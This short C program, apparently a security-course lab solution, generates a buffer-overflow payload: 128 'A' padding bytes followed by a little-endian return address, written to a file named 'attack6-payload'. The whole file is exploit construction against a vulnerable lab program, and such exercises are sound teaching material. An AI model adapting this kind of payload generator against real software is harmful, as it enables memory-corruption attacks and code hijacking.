#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately */
    char buf[132];
	memset(buf, 'A', 128);  
	buf[128]=0x04;
	buf[129]=0x86;
	buf[130]=0x04;
	buf[131]=0x08;
	
    write_to_file( "attack6-payload", buf , 132 , FILE_CLEAR );
    exit(0);
}
